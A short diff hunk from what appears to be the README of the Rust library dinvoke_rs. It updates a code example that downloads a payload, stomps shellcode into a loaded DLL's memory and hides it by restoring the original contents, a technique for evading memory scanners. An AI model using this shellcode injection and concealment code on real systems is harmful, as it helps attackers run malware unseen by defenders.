@@ -374,9 +374,9 @@ Once the shellcode has been stomped, you can use dmanager crate to hide/restomp 
 
 ```rust
 let payload_content = download_function();
-let my_dll = dinvoke::load_library_a("somedll.dll");
-let overload = overload::managed_module_stomping(&payload_content, 0, my_dll).unwrap();
-let mut manager = dmanager::Manager::new();
+let my_dll = dinvoke_rs::dinvoke::load_library_a("somedll.dll");
+let overload = dinvoke_rs::overload::managed_module_stomping(&payload_content, 0, my_dll).unwrap();
+let mut manager = dinvoke_rs::dmanager::Manager::new();
 let _r = manager.new_shellcode(overload.1, payload_content, overload.0).unwrap(); // The manager will take care of the fluctuation process
 let _r = manager.hide_shellcode(overload.1).unwrap(); // We restore the memory's original content and hide our shellcode
  ... 
